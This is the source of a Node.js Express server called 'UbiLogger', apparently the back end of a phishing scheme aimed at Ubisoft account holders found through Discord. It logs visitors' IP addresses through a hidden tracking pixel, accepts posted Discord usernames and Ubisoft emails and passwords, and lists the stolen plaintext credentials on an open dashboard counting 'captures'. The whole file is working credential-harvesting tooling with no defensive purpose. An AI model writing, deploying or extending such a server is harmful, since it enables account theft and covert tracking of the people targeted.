const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// In-memory storage (captures reset if server restarts)
let captures = [];

app.use(express.json());

app.get('/', (req, res) => {
  res.send('UbiLogger Server is running');
});

app.get('/capture', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  console.log(`[IP] ${ip}`);
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.set('Content-Type', 'image/gif');
  res.send(pixel);
});

app.post('/save', (req, res) => {
  const data = req.body;
  data.timestamp = new Date().toISOString();
  captures.unshift(data);
  console.log(`[SAVED] ${data.discord_username} - ${data.ubi_email}`);
  res.json({ success: true });
});

app.get('/dashboard', (req, res) => {
  let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>UbiLink Dashboard</title>
        <style>
            body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
            h1 { color: #f97316; }
            table { width: 100%; border-collapse: collapse; background: #1a1a1a; }
            th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
            th { background: #2a2a2a; color: #f97316; }
            .password { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
            .stats { display: flex; gap: 15px; margin-bottom: 20px; }
            .stat-card { background: #1a1a1a; padding: 15px; border-radius: 10px; text-align: center; }
            .stat-number { font-size: 32px; font-weight: bold; color: #f97316; }
        </style>
    </head>
    <body>
        <h1>UbiLink Dashboard</h1>
        <div class="stats">
            <div class="stat-card"><div class="stat-number">${captures.length}</div><div>Total Captures</div></div>
        </div>
         <table>
            <thead>
                <tr><th>Discord User</th><th>Email</th><th>Password</th><th>Platform</th><th>Time</th></tr>
            </thead>
            <tbody>
  `;
  
  for (const c of captures) {
    html += `
      <tr>
        <td>${escapeHtml(c.discord_username)}</td>
        <td>${escapeHtml(c.ubi_email)}</td>
        <td><span class="password">${escapeHtml(c.ubi_password)}</span></td>
        <td>${escapeHtml(c.platform)}</td>
        <td>${new Date(c.timestamp).toLocaleString()}</td>
      </tr>
    `;
  }
  
  html += `
            </tbody>
         </table>
    </body>
    </html>
  `;
  
  res.send(html);
});

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/[&<>]/g, function(m) {
    if (m === '&') return '&amp;';
    if (m === '<') return '&lt;';
    if (m === '>') return '&gt;';
    return m;
  });
}

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});